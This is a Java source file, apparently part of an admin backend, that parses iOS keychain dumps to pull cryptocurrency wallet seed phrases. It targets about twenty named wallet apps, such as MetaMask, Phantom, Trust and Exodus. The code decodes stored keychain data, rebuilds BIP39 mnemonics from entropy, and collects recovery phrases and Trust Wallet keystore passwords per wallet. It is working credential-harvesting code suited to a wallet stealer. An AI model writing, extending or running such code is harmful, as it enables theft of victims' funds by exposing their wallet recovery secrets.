package com.admin.parse;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.springframework.stereotype.Component;

import com.alibaba.fastjson.JSON;
import com.admin.util.Bip39Util;

import lombok.Data;
import lombok.RequiredArgsConstructor;

/**
 * 对齐 Python keychain_parse：从 keychain.xml 提取钱包助记词。
 */
@Component
@RequiredArgsConstructor
public class KeychainParse {

    private static final Pattern ITEM_SPLIT = Pattern.compile("(?i)<item>");
    private static final Pattern AGRP = Pattern.compile("(?i)<agrp>([^<]*)</agrp>");
    private static final Pattern ACCT = Pattern.compile("(?i)<acct>([^<]*)</acct>");
    private static final Pattern SVCE = Pattern.compile("(?i)<svce>([^<]*)</svce>");
    private static final Pattern VDATA = Pattern.compile("(?i)<v_Data bin=\"1\">([^<]*)</v_Data>");

    private static final String[][] AGRP_WALLET = {
            {"app.phantom", "phantom"},
            {"io.metamask.metamask", "metamask"},
            {"im.token.app", "imtoken"},
            {"com.tronlink.hdwallet", "tronlink"},
            {"com.tonhub.app", "tonhub"},
            {"com.jbig.tonkeeper", "tonkeeper"},
            {"org.mytonwallet.app", "mytonwallet"},
            {"com.sixdays.trust", "trust"},
            {"com.global.wallet.ios", "globalwallet"},
            {"exodus-movement.exodus", "exodus"},
            {"coin98.crypto.finance.insights", "coin98"},
            {"com.bitpie.wallet", "bitpie"},
            {"com.bitkeep.os", "bitkeep"},
            {"com.uniswap.mobile", "uniswap"},
            {"com.okex.okexappstorefull", "okx"},
            {"com.solflare.mobile", "solflare"},
            {"org.toshi", "coinbase"},
            {"com.bakkenbaeck.token", "coinbase"},
            {"so.onekey.wallet", "onekey"},
            {"com.digitalshield.walletapp", "digitalshield"},
    };

    private static final String[] NOISE = {"firebase", "appsflyer", "iid.checkin", "google.iid", "branchkeychain"};
    private static final String[] MNEMONIC_KEYS = {
            "mnemonic", "seedphrase", "seed_phrase", "recoveryphrase", "secretphrase", "phrase"
    };

    private final Bip39Util bip39Util;

    @Data
    public static class WalletHit {
        private List<String> phrases = new ArrayList<>();
        private String source;
        private Map<String, String> utcPasswords = new LinkedHashMap<>();
    }

    public Map<String, WalletHit> extract(Path keychainPath) {
        Map<String, WalletHit> hits = new LinkedHashMap<>();
        if (keychainPath == null || !Files.isRegularFile(keychainPath)) {
            return hits;
        }
        String text;
        try {
            text = Files.readString(keychainPath, StandardCharsets.UTF_8);
        } catch (Exception e) {
            try {
                text = Files.readString(keychainPath);
            } catch (Exception e2) {
                return hits;
            }
        }
        String[] blocks = ITEM_SPLIT.split(text);
        for (int i = 1; i < blocks.length; i++) {
            String block = blocks[i];
            String agrp = group(AGRP, block);
            String acct = group(ACCT, block);
            String svce = group(SVCE, block);
            String wkey = walletKeyFromAgrp(agrp);
            if (wkey == null) {
                continue;
            }
            String blob = (acct + " " + svce).toLowerCase(Locale.ROOT);
            boolean noise = false;
            for (String n : NOISE) {
                if (blob.contains(n)) {
                    noise = true;
                    break;
                }
            }
            if (noise) {
                continue;
            }
            byte[] raw = decodeVdata(group(VDATA, block));
            String decoded = null;
            if (raw.length > 0) {
                decoded = new String(raw, StandardCharsets.UTF_8).replace("\0", "").trim();
            }
            List<String> phrases = phrasesFromItem(acct, decoded, raw);
            String utcName = "trust".equals(wkey) ? TrustWallet.utcFilenameFromAcct(acct) : null;
            if (phrases.isEmpty() && utcName == null) {
                continue;
            }
            WalletHit hit = hits.computeIfAbsent(wkey, k -> new WalletHit());
            for (String p : phrases) {
                addPhrase(hit.getPhrases(), p);
            }
            if (utcName != null && decoded != null && !decoded.isEmpty()) {
                hit.getUtcPasswords().put(utcName, decoded);
            }
            if (!hit.getPhrases().isEmpty() && hit.getSource() == null) {
                hit.setSource(sourceLabel(wkey, acct));
            }
        }
        return hits;
    }

    private String sourceLabel(String wkey, String acct) {
        if ("coin98".equals(wkey) && "WALLET_SECURE_BACKUP".equals(acct)) {
            return "Keychain WALLET_SECURE_BACKUP";
        }
        if ("exodus".equals(wkey)) {
            return "Keychain unused_data";
        }
        if ("uniswap".equals(wkey)) {
            return "Keychain mnemonic";
        }
        if ("bitpie".equals(wkey)) {
            return "Keychain seedPhraseEntropy";
        }
        if ("phantom".equals(wkey)) {
            return "Keychain vault entropy";
        }
        return "Keychain 明文";
    }

    private List<String> phrasesFromItem(String acct, String text, byte[] raw) {
        List<String> found = new ArrayList<>();
        String acctL = acct == null ? "" : acct.toLowerCase(Locale.ROOT);
        if (acctL.contains("mnemonic") || acctL.endsWith(".mnemonic")) {
            addPhrase(found, stripQuotes(text));
        }
        if ("seedphraseentropy".equals(acct) || acctL.contains("seedphraseentropy")) {
            if (text != null && !text.isEmpty()) {
                addPhrase(found, bip39Util.hexEntropyToMnemonic(text));
            } else if (raw != null && (raw.length == 16 || raw.length == 20 || raw.length == 24
                    || raw.length == 28 || raw.length == 32)) {
                addPhrase(found, bip39Util.entropyToMnemonic(raw));
            }
            return found;
        }
        if (text != null && !text.isEmpty()) {
            addPhrase(found, stripQuotes(text));
            try {
                walkJson(JSON.parse(text), found);
            } catch (Exception ignored) {
            }
            if (found.isEmpty()) {
                addPhrase(found, bip39Util.searchPhrase(text));
            }
        }
        return found;
    }

    private void walkJson(Object obj, List<String> dst) {
        if (obj instanceof com.alibaba.fastjson.JSONObject) {
            com.alibaba.fastjson.JSONObject jo = (com.alibaba.fastjson.JSONObject) obj;
            for (String k : jo.keySet()) {
                Object v = jo.get(k);
                String kl = k.toLowerCase(Locale.ROOT);
                for (String mk : MNEMONIC_KEYS) {
                    if (mk.equals(kl) && v instanceof String) {
                        addPhrase(dst, (String) v);
                    }
                }
                walkJson(v, dst);
            }
            Object ent = jo.get("entropy");
            if (ent instanceof com.alibaba.fastjson.JSONObject) {
                com.alibaba.fastjson.JSONObject e = (com.alibaba.fastjson.JSONObject) ent;
                int n = e.size();
                if (n > 0) {
                    try {
                        byte[] blob = new byte[n];
                        for (int i = 0; i < n; i++) {
                            blob[i] = (byte) (e.getIntValue(String.valueOf(i)) & 0xff);
                        }
                        addPhrase(dst, bip39Util.entropyToMnemonic(blob));
                    } catch (Exception ignored) {
                    }
                }
            } else if (ent instanceof String) {
                addPhrase(dst, bip39Util.hexEntropyToMnemonic((String) ent));
            }
        } else if (obj instanceof com.alibaba.fastjson.JSONArray) {
            com.alibaba.fastjson.JSONArray arr = (com.alibaba.fastjson.JSONArray) obj;
            for (int i = 0; i < arr.size(); i++) {
                walkJson(arr.get(i), dst);
            }
        } else if (obj instanceof String) {
            String s = (String) obj;
            if (s.split("\\s+").length >= 12) {
                addPhrase(dst, s);
            }
        }
    }

    private void addPhrase(List<String> dst, String phrase) {
        if (phrase == null) {
            return;
        }
        String norm = phrase.trim().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
        if (bip39Util.validateMnemonic(norm) && !dst.contains(norm)) {
            dst.add(norm);
        }
    }

    private static String walletKeyFromAgrp(String agrp) {
        String low = agrp == null ? "" : agrp.toLowerCase(Locale.ROOT);
        for (String[] row : AGRP_WALLET) {
            if (low.contains(row[0])) {
                return row[1];
            }
        }
        return null;
    }

    private static byte[] decodeVdata(String b64) {
        if (b64 == null || b64.trim().isEmpty()) {
            return new byte[0];
        }
        try {
            return Base64.getDecoder().decode(b64.trim());
        } catch (Exception e) {
            return new byte[0];
        }
    }

    private static String group(Pattern p, String block) {
        Matcher m = p.matcher(block);
        return m.find() ? m.group(1).trim() : "";
    }

    private static String stripQuotes(String text) {
        if (text == null) {
            return null;
        }
        return text.trim().replaceAll("^\"|\"$", "");
    }
}
